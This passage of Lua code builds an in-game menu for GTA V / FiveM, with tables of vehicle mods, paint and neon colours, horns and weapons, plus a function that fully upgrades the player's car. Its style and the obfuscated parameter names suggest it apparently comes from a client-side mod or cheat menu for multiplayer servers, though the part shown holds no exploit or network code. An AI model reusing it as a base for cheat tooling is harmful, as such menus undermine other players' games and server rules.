"WEAPON_FIREEXTINGUISHER",
"WEAPON_PETROLCAN",
"WEAPON_SNOWBALL",
"WEAPON_FLARE",
"WEAPON_BALL",
"WEAPON_MINIGUN"
}

local function debugPrint(text)
    if Plane.debug then
        Citizen.Trace("[Plane] "..tostring(text))
    end
end


local function setMenuProperty(id, property, value)
    if id and menus[id] then
        menus[id][property] = value
        debugPrint(id.." menu property changed: { "..tostring(property)..", "..tostring(value).." }")
    end
end


local function isMenuVisible(id)
    if id and menus[id] then
        return menus[id].visible
    else
        return false
    end
end

if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end

local bv = false

local bx = GetPlayerServerId(PlayerPedId(-1))
local by = GetPlayerName(bx)

local bl = {
    {
        name = "~h~Spoilers",
        id = 0
    },
    {
        name = "~h~Front Bumper",
        id = 1
    },
    {
        name = "~h~Rear Bumper",
        id = 2
    },
    {
        name = "~h~Side Skirt",
        id = 3
    },
    {
        name = "~h~Exhaust",
        id = 4
    },
    {
        name = "~h~Frame",
        id = 5
    },
    {
        name = "~h~Grille",
        id = 6
    },
    {
        name = "~h~Hood",
        id = 7
    },
    {
        name = "~h~Fender",
        id = 8
    },
    {
        name = "~h~Right Fender",
        id = 9
    },
    {
        name = "~h~Roof",
        id = 10
    },
    {
        name = "~h~Vanity Plates",
        id = 25
    },
    {
        name = "~h~Trim",
        id = 27
    },
    {
        name = "~h~Ornaments",
        id = 28
    },
    {
        name = "~h~Dashboard",
        id = 29
    },
    {
        name = "~h~Dial",
        id = 30
    },
    {
        name = "~h~Door Speaker",
        id = 31
    },
    {
        name = "~h~Seats",
        id = 32
    },
    {
        name = "~h~Steering Wheel",
        id = 33
    },
    {
        name = "~h~Shifter Leavers",
        id = 34
    },
    {
        name = "~h~Plaques",
        id = 35
    },
    {
        name = "~h~Speakers",
        id = 36
    },
    {
        name = "~h~Trunk",
        id = 37
    },
    {
        name = "~h~Hydraulics",
        id = 38
    },
    {
        name = "~h~Engine Block",
        id = 39
    },
    {
        name = "~h~Air Filter",
        id = 40
    },
    {
        name = "~h~Struts",
        id = 41
    },
    {
        name = "~h~Arch Cover",
        id = 42
    },
    {
        name = "~h~Aerials",
        id = 43
    },
    {
        name = "~h~Trim 2",
        id = 44
    },
    {
        name = "~h~Tank",
        id = 45
    },
    {
        name = "~h~Windows",
        id = 46
    },
    {
        name = "~h~Livery",
        id = 48
    },
    {
        name = "~h~Horns",
        id = 14
    },
    {
        name = "~h~Wheels",
        id = 23
    },
    {
        name = "~h~Wheel Types",
        id = "wheeltypes"
    },
    {
        name = "~h~Extras",
        id = "extra"
    },
    {
        name = "~h~Neons",
        id = "neon"
    },
    {
        name = "~h~Paint",
        id = "paint"
    },
    {
        name = "~h~Headlights Color",
        id = "headlight"
    },
    {
        name = "~h~Licence Plate",
        id = "licence"
    }
}


local function setMenuVisible(id, visible, holdCurrent)
    if id and menus[id] then
        setMenuProperty(id, "visible", visible)

        if not holdCurrent and menus[id] then
            setMenuProperty(id, "currentOption", 1)
        end

        if visible then
            if id ~= currentMenu and isMenuVisible(currentMenu) then
                setMenuVisible(currentMenu, false)
            end

            currentMenu = id
        end
    end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)

    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end

    if menus[currentMenu] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
            SetTextRightJustify(true)
        end
    end

    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end


local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight / 2

        if menus[currentMenu].titleBackgroundSprite then
            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
        else
            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
        end

        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
    end
end


local function drawSubTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

        local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255 }

        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

        if optionCount > menus[currentMenu].maxOptionCount then
            drawText(tostring(menus[currentMenu].currentOption).." / "..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
        end
    end
end


local function drawButton(text, subText)
    local x = menus[currentMenu].x + menus[currentMenu].width / 2
    local multiplier = nil

    if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
        multiplier = optionCount
    elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
        local backgroundColor = nil
        local textColor = nil
        local subTextColor = nil
        local shadow = false

        if menus[currentMenu].currentOption == optionCount then
            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
            textColor = menus[currentMenu].menuFocusTextColor
            subTextColor = menus[currentMenu].menuFocusTextColor
        else
            backgroundColor = menus[currentMenu].menuBackgroundColor
            textColor = menus[currentMenu].menuTextColor
            subTextColor = menus[currentMenu].menuSubTextColor
            shadow = true
        end

        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

        if subText then
            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
        end
    end
end


function Plane.CreateMenu(id, title)
    -- Default settings
    menus[id] = { }
    menus[id].title = title

    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

    menus[id].x = 0.725
    menus[id].y = 0.2
    menus[id].width = 0.225

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 10

    menus[id].titleFont = 1
    menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
    menus[id].titleBackgroundSprite = nil

    menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuFocusTextColor = { r = 0, g = 255, b = 255, a = 255 }
    menus[id].menuFocusBackgroundColor = { r = 60, g = 60, b = 60, a = 180 }
    menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }

    menus[id].subTitleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }

    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5

    debugPrint(tostring(id).." menu created")
end


function Plane.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        Plane.CreateMenu(id, menus[parent].title)

        if subTitle then
            setMenuProperty(id, "subTitle", string.upper(subTitle))
        else
            setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
        end

        setMenuProperty(id, "previousMenu", parent)

        setMenuProperty(id, "x", menus[parent].x)
        setMenuProperty(id, "y", menus[parent].y)
        setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
        setMenuProperty(id, "titleFont", menus[parent].titleFont)
        setMenuProperty(id, "titleColor", menus[parent].titleColor)
        setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
        setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
        setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
        setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
        setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
        setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
        setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
        setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
    else
        debugPrint("Failed to create "..tostring(id).." submenu: "..tostring(parent).." parent menu doesn\"t exist")
    end
end


function Plane.CurrentMenu()
    return currentMenu
end


function Plane.OpenMenu(id)
    if id and menus[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        setMenuVisible(id, true)
        debugPrint(tostring(id).." menu opened")
    else
        debugPrint("Failed to open "..tostring(id).." menu: it doesn\"t exist")
    end
end


function Plane.IsMenuOpened(id)
    return isMenuVisible(id)
end


function Plane.IsAnyMenuOpened()
    for id, _ in pairs(menus) do
        if isMenuVisible(id) then return true end
    end

    return false
end


function Plane.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
        return menus[currentMenu].aboutToBeClosed
    else
        return false
    end
end


function Plane.CloseMenu()
    if menus[currentMenu] then
        if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu).." menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
        else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu).." menu about to be closed")
        end
    end
end


function Plane.Button(text, subText)
    local buttonText = text
    if subText then
        buttonText = "{ "..tostring(buttonText)..", "..tostring(subText).." }"
    end

    if menus[currentMenu] then
        optionCount = optionCount + 1

        local isCurrent = menus[currentMenu].currentOption == optionCount

        drawButton(text, subText)

        if isCurrent then
            if currentKey == keys.select then
                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                debugPrint(buttonText.." button pressed")
                return true
            elseif currentKey == keys.left or currentKey == keys.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end

        return false
    else
        debugPrint("Failed to create "..buttonText.." button: "..tostring(currentMenu).." menu doesn\"t exist")

        return false
    end
end


function Plane.MenuButton(text, id)
    if menus[id] then
        if Plane.Button(text) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)

            return true
        end
    else
        debugPrint("Failed to create "..tostring(text).." menu button: "..tostring(id).." submenu doesn\"t exist")
    end

    return false
end

local bm = {
    {
        name = "~h~~r~Engine",
        id = 11
    },
    {
        name = "~h~~b~Brakes",
        id = 12
    },
    {
        name = "~h~~g~Transmission",
        id = 13
    },
    {
        name = "~h~~y~Suspension",
        id = 15
    },
    {
        name = "~h~~b~Armor",
        id = 16
    }
}

function Plane.CheckBox(text, checked, callback)
    if Plane.Button(text, checked and "~w~~h~On" or "~h~~c~Off") then
        checked = not checked
        debugPrint(tostring(text).." checkbox changed to "..tostring(checked))
        if callback then callback(checked) end

        return true
    end

    return false
end


function Plane.ComboBox(text, items, currentIndex, selectedIndex, callback)
    local itemsCount = #items
    local selectedItem = items[currentIndex]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = "← "..tostring(selectedItem).." →"
    end

    if Plane.Button(text, selectedItem) then
        selectedIndex = currentIndex
        callback(currentIndex, selectedIndex)
        return true
    elseif isCurrent then
        if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
        elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
        end
    else
        currentIndex = selectedIndex
    end

    callback(currentIndex, selectedIndex)
    return false
end

function Plane.Display()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            Plane.CloseMenu()
        else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = nil

            if IsControlJustReleased(1, keys.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption < optionCount then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                else
                    menus[currentMenu].currentOption = 1
                end
            elseif IsControlJustReleased(1, keys.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption > 1 then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                else
                    menus[currentMenu].currentOption = optionCount
                end
            elseif IsControlJustReleased(1, keys.left) then
                currentKey = keys.left
            elseif IsControlJustReleased(1, keys.right) then
                currentKey = keys.right
            elseif IsControlJustReleased(1, keys.select) then
                currentKey = keys.select
            elseif IsControlJustReleased(1, keys.back) then
                if menus[menus[currentMenu].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    setMenuVisible(menus[currentMenu].previousMenu, true)
                else
                    Plane.CloseMenu()
                end
            end

            optionCount = 0
        end
    end
end


function Plane.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function Plane.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function Plane.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function Plane.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function Plane.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function Plane.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function Plane.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function Plane.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function Plane.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function Plane.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function Plane.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function Plane.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function Plane.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function Plane.SetMenuButtonPressedSound(id, name, set)
    setMenuProperty(id, "buttonPressedSound", { ["name"] = name, ["set"] = set })
end

function drawNotification(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(false, false)
end

function getEntity(player)
    local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(u)
    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
 end

 local bn = {
    {
        name = "~h~Blue on White 2",
        id = 0
    },
    {
        name = "~h~Blue on White 3",
        id = 4
    },
    {
        name = "~h~Yellow on Blue",
        id = 2
    },
    {
        name = "~h~Yellow on Black",
        id = 1
    },
    {
        name = "~h~North Yankton",
        id = 5
    }
}
local bo = {
    {
        name = "~h~Default",
        id = -1
    },
    {
        name = "~h~White",
        id = 0
    },
    {
        name = "~h~Blue",
        id = 1
    },
    {
        name = "~h~Electric Blue",
        id = 2
    },
    {
        name = "~h~Mint Green",
        id = 3
    },
    {
        name = "~h~Lime Green",
        id = 4
    },
    {
        name = "~h~Yellow",
        id = 5
    },
    {
        name = "~h~Golden Shower",
        id = 6
    },
    {
        name = "~h~Orange",
        id = 7
    },
    {
        name = "~h~Red",
        id = 8
    },
    {
        name = "~h~Pony Pink",
        id = 9
    },
    {
        name = "~h~Hot Pink",
        id = 10
    },
    {
        name = "~h~Purple",
        id = 11
    },
    {
        name = "~h~Blacklight",
        id = 12
    }
}
local bp = {
    ["Stock Horn"] = -1,
    ["Truck Horn"] = 1,
    ["Police Horn"] = 2,
    ["Clown Horn"] = 3,
    ["Musical Horn 1"] = 4,
    ["Musical Horn 2"] = 5,
    ["Musical Horn 3"] = 6,
    ["Musical Horn 4"] = 7,
    ["Musical Horn 5"] = 8,
    ["Sad Trombone Horn"] = 9,
    ["Classical Horn 1"] = 10,
    ["Classical Horn 2"] = 11,
    ["Classical Horn 3"] = 12,
    ["Classical Horn 4"] = 13,
    ["Classical Horn 5"] = 14,
    ["Classical Horn 6"] = 15,
    ["Classical Horn 7"] = 16,
    ["Scaledo Horn"] = 17,
    ["Scalere Horn"] = 18,
    ["Salemi Horn"] = 19,
    ["Scalefa Horn"] = 20,
    ["Scalesol Horn"] = 21,
    ["Scalela Horn"] = 22,
    ["Scaleti Horn"] = 23,
    ["Scaledo Horn High"] = 24,
    ["Jazz Horn 1"] = 25,
    ["Jazz Horn 2"] = 26,
    ["Jazz Horn 3"] = 27,
    ["Jazz Loop Horn"] = 28,
    ["Starspangban Horn 1"] = 28,
    ["Starspangban Horn 2"] = 29,
    ["Starspangban Horn 3"] = 30,
    ["Starspangban Horn 4"] = 31,
    ["Classical Loop 1"] = 32,
    ["Classical Horn 8"] = 33,
    ["Classical Loop 2"] = 34
}
local bq = {
    ["White"] = {
        255,
        255,
        255
    },
    ["Blue"] = {
        0,
        0,
        255
    },
    ["Electric Blue"] = {
        0,
        150,
        255
    },
    ["Mint Green"] = {
        50,
        255,
        155
    },
    ["Lime Green"] = {
        0,
        255,
        0
    },
    ["Yellow"] = {
        255,
        255,
        0
    },
    ["Golden Shower"] = {
        204,
        204,
        0
    },
    ["Orange"] = {
        255,
        128,
        0
    },
    ["Red"] = {
        255,
        0,
        0
    },
    ["Pony Pink"] = {
        255,
        102,
        255
    },
    ["Hot Pink"] = {
        255,
        0,
        255
    },
    ["Purple"] = {
        153,
        0,
        153
    }
}
local br = {
    {
        name = "~h~Black",
        id = 0
    },
    {
        name = "~h~Carbon Black",
        id = 147
    },
    {
        name = "~h~Graphite",
        id = 1
    },
    {
        name = "~h~Anhracite Black",
        id = 11
    },
    {
        name = "~h~Black Steel",
        id = 2
    },
    {
        name = "~h~Dark Steel",
        id = 3
    },
    {
        name = "~h~Silver",
        id = 4
    },
    {
        name = "~h~Bluish Silver",
        id = 5
    },
    {
        name = "~h~Rolled Steel",
        id = 6
    },
    {
        name = "~h~Shadow Silver",
        id = 7
    },
    {
        name = "~h~Stone Silver",
        id = 8
    },
    {
        name = "~h~Midnight Silver",
        id = 9
    },
    {
        name = "~h~Cast Iron Silver",
        id = 10
    },
    {
        name = "~h~Red",
        id = 27
    },
    {
        name = "~h~Torino Red",
        id = 28
    },
    {
        name = "~h~Formula Red",
        id = 29
    },
    {
        name = "~h~Lava Red",
        id = 150
    },
    {
        name = "~h~Blaze Red",
        id = 30
    },
    {
        name = "~h~Grace Red",
        id = 31
    },
    {
        name = "~h~Garnet Red",
        id = 32
    },
    {
        name = "~h~Sunset Red",
        id = 33
    },
    {
        name = "~h~Cabernet Red",
        id = 34
    },
    {
        name = "~h~Wine Red",
        id = 143
    },
    {
        name = "~h~Candy Red",
        id = 35
    },
    {
        name = "~h~Hot Pink",
        id = 135
    },
    {
        name = "~h~Pfsiter Pink",
        id = 137
    },
    {
        name = "~h~Salmon Pink",
        id = 136
    },
    {
        name = "~h~Sunrise Orange",
        id = 36
    },
    {
        name = "~h~Orange",
        id = 38
    },
    {
        name = "~h~Bright Orange",
        id = 138
    },
    {
        name = "~h~Gold",
        id = 99
    },
    {
        name = "~h~Bronze",
        id = 90
    },
    {
        name = "~h~Yellow",
        id = 88
    },
    {
        name = "~h~Race Yellow",
        id = 89
    },
    {
        name = "~h~Dew Yellow",
        id = 91
    },
    {
        name = "~h~Dark Green",
        id = 49
    },
    {
        name = "~h~Racing Green",
        id = 50
    },
    {
        name = "~h~Sea Green",
        id = 51
    },
    {
        name = "~h~Olive Green",
        id = 52
    },
    {
        name = "~h~Bright Green",
        id = 53
    },
    {
        name = "~h~Gasoline Green",
        id = 54
    },
    {
        name = "~h~Lime Green",
        id = 92
    },
    {
        name = "~h~Midnight Blue",
        id = 141
    },
    {
        name = "~h~Galaxy Blue",
        id = 61
    },
    {
        name = "~h~Dark Blue",
        id = 62
    },
    {
        name = "~h~Saxon Blue",
        id = 63
    },
    {
        name = "~h~Blue",
        id = 64
    },
    {
        name = "~h~Mariner Blue",
        id = 65
    },
    {
        name = "~h~Harbor Blue",
        id = 66
    },
    {
        name = "~h~Diamond Blue",
        id = 67
    },
    {
        name = "~h~Surf Blue",
        id = 68
    },
    {
        name = "~h~Nautical Blue",
        id = 69
    },
    {
        name = "~h~Racing Blue",
        id = 73
    },
    {
        name = "~h~Ultra Blue",
        id = 70
    },
    {
        name = "~h~Light Blue",
        id = 74
    },
    {
        name = "~h~Chocolate Brown",
        id = 96
    },
    {
        name = "~h~Bison Brown",
        id = 101
    },
    {
        name = "~h~Creeen Brown",
        id = 95
    },
    {
        name = "~h~Feltzer Brown",
        id = 94
    },
    {
        name = "~h~Maple Brown",
        id = 97
    },
    {
        name = "~h~Beechwood Brown",
        id = 103
    },
    {
        name = "~h~Sienna Brown",
        id = 104
    },
    {
        name = "~h~Saddle Brown",
        id = 98
    },
    {
        name = "~h~Moss Brown",
        id = 100
    },
    {
        name = "~h~Woodbeech Brown",
        id = 102
    },
    {
        name = "~h~Straw Brown",
        id = 99
    },
    {
        name = "~h~Sandy Brown",
        id = 105
    },
    {
        name = "~h~Bleached Brown",
        id = 106
    },
    {
        name = "~h~Schafter Purple",
        id = 71
    },
    {
        name = "~h~Spinnaker Purple",
        id = 72
    },
    {
        name = "~h~Midnight Purple",
        id = 142
    },
    {
        name = "~h~Bright Purple",
        id = 145
    },
    {
        name = "~h~Cream",
        id = 107
    },
    {
        name = "~h~Ice White",
        id = 111
    },
    {
        name = "~h~Frost White",
        id = 112
    }
}
local bt = {
    {
        name = "~h~Black",
        id = 12
    },
    {
        name = "~h~Gray",
        id = 13
    },
    {
        name = "~h~Light Gray",
        id = 14
    },
    {
        name = "~h~Ice White",
        id = 131
    },
    {
        name = "~h~Blue",
        id = 83
    },
    {
        name = "~h~Dark Blue",
        id = 82
    },
    {
        name = "~h~Midnight Blue",
        id = 84
    },
    {
        name = "~h~Midnight Purple",
        id = 149
    },
    {
        name = "~h~Schafter Purple",
        id = 148
    },
    {
        name = "~h~Red",
        id = 39
    },
    {
        name = "~h~Dark Red",
        id = 40
    },
    {
        name = "~h~Orange",
        id = 41
    },
    {
        name = "~h~Yellow",
        id = 42
    },
    {
        name = "~h~Lime Green",
        id = 55
    },
    {
        name = "~h~Green",
        id = 128
    },
    {
        name = "~h~Forest Green",
        id = 151
    },
    {
        name = "~h~Foliage Green",
        id = 155
    },
    {
        name = "~h~Olive Darb",
        id = 152
    },
    {
        name = "~h~Dark Earth",
        id = 153
    },
    {
        name = "~h~Desert Tan",
        id = 154
    }
}
local bu = {
    {
        name = "~h~Brushed Steel",
        id = 117
    },
    {
        name = "~h~Brushed Black Steel",
        id = 118
    },
    {
        name = "~h~Brushed Aluminum",
        id = 119
    },
    {
        name = "~h~Pure Gold",
        id = 158
    },
    {
        name = "~h~Brushed Gold",
        id = 159
    }
}
 

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
